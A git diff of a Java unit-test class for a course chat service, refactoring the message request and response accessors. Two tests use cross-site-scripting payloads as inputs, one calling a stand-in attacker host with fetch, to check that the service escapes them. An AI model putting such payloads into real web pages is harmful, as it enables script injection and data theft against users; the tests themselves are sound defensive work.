@@ -50,11 +50,7 @@ class ChatServiceTest {
     @Test
     void shouldSendCourseQuestionSuccessfully() {
 
-        SendMessageRequest request = new SendMessageRequest();
-
-        request.setContent(
-                "Professor, could you clarify the assignment deadline?"
-        );
+        SendMessageRequest request = new SendMessageRequest("Professor, could you clarify the assignment deadline?");
 
         ChatRoom room = new ChatRoom();
 
@@ -84,7 +80,7 @@ class ChatServiceTest {
 
         assertEquals(
                 "Professor, could you clarify the assignment deadline?",
-                response.getContent()
+                response.content()
         );
 
         verify(chatMessageRepository, times(1))
@@ -94,11 +90,7 @@ class ChatServiceTest {
     @Test
     void shouldRejectUnauthorizedCourseAccess() {
 
-        SendMessageRequest request = new SendMessageRequest();
-
-        request.setContent(
-                "Trying to access restricted course chat"
-        );
+        SendMessageRequest request = new SendMessageRequest("Trying to access restricted course chat");
 
         when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                 .thenReturn(false);
@@ -119,11 +111,8 @@ class ChatServiceTest {
     @Test
     void shouldSanitizeMaliciousScriptInjection() {
 
-        SendMessageRequest request = new SendMessageRequest();
+        SendMessageRequest request = new SendMessageRequest("<script>fetch('http://attacker.com')</script>");
 
-        request.setContent(
-                "<script>fetch('http://attacker.com')</script>"
-        );
 
         ChatRoom room = new ChatRoom();
 
@@ -153,7 +142,7 @@ class ChatServiceTest {
         assertEquals(
                 "&lt;script&gt;fetch('http://attacker.com')" +
                         "&lt;/script&gt;",
-                response.getContent()
+                response.content()
         );
     }
 
@@ -194,12 +183,12 @@ class ChatServiceTest {
 
         assertEquals(
                 "Does anyone understand exercise 3?",
-                responses.get(0).getContent()
+                responses.get(0).content()
         );
 
         assertEquals(
                 "Yes, the professor explained it in class yesterday.",
-                responses.get(1).getContent()
+                responses.get(1).content()
         );
     }
 
@@ -223,8 +212,7 @@ class ChatServiceTest {
     @Test
     void shouldPopulateChatMessageCorrectlyWhenSendingMessage() {
 
-        SendMessageRequest request = new SendMessageRequest();
-        request.setContent("Hello professor");
+        SendMessageRequest request = new SendMessageRequest("Hello professor");
 
         ChatRoom room = new ChatRoom();
 
@@ -249,8 +237,7 @@ class ChatServiceTest {
     @Test
     void shouldEnsureMessageIsSanitizedAndNotEqualToOriginal() {
 
-        SendMessageRequest request = new SendMessageRequest();
-        request.setContent("<script>alert('hack')</script>");
+        SendMessageRequest request = new SendMessageRequest("<script>alert('hack')</script>");
 
         ChatRoom room = new ChatRoom();
 
@@ -266,18 +253,17 @@ class ChatServiceTest {
         ChatMessageResponse response =
                 chatService.sendMessage(userId, chatRoomId, request);
 
-        assertNotEquals("<script>alert('hack')</script>", response.getContent());
+        assertNotEquals("<script>alert('hack')</script>", response.content());
 
-        assertTrue(response.getContent().contains("&lt;"));
-        assertTrue(response.getContent().contains("&gt;"));
+        assertTrue(response.content().contains("&lt;"));
+        assertTrue(response.content().contains("&gt;"));
     }
 
 
     @Test
     void shouldExecuteSendMessageMappingLogic() {
 
-        SendMessageRequest request = new SendMessageRequest();
-        request.setContent("Hello");
+        SendMessageRequest request = new SendMessageRequest("Hello");
 
         ChatRoom room = new ChatRoom();
 
@@ -293,15 +279,14 @@ class ChatServiceTest {
         ChatMessageResponse response =
                 chatService.sendMessage(userId, chatRoomId, request);
 
-        assertNotNull(response.getContent());
-        assertEquals("Hello", response.getContent());
+        assertNotNull(response.content());
+        assertEquals("Hello", response.content());
     }
 
     @Test
     void shouldPreserveMessageFlowEndToEnd() {
 
-        SendMessageRequest request = new SendMessageRequest();
-        request.setContent("Message flow test");
+        SendMessageRequest request = new SendMessageRequest("Message flow test");
 
         ChatRoom room = new ChatRoom();
 
@@ -318,17 +303,16 @@ class ChatServiceTest {
                 chatService.sendMessage(userId, chatRoomId, request);
 
         assertAll(
-                () -> assertEquals("Message flow test", response.getContent()),
+                () -> assertEquals("Message flow test", response.content()),
                 () -> assertNotNull(response),
-                () -> assertFalse(response.getContent().isBlank())
+                () -> assertFalse(response.content().isBlank())
         );
     }
 
     @Test
     void shouldExecuteSendMessageLambdaCoverage() {
 
-        SendMessageRequest request = new SendMessageRequest();
-        request.setContent("lambda coverage test");
+        SendMessageRequest request = new SendMessageRequest("lambda coverage test");
 
         ChatRoom room = new ChatRoom();
 
@@ -347,14 +331,13 @@ class ChatServiceTest {
                 chatService.sendMessage(userId, chatRoomId, request);
 
         assertNotNull(response);
-        assertEquals("lambda coverage test", response.getContent());
+        assertEquals("lambda coverage test", response.content());
     }
 
     @Test
     void shouldThrowWhenChatRoomNotFound_realPath() {
 
-        SendMessageRequest request = new SendMessageRequest();
-        request.setContent("test");
+        SendMessageRequest request = new SendMessageRequest("test");
 
         when(enrollmentService.isUserEnrolled(userId, chatRoomId))
                 .thenReturn(true);
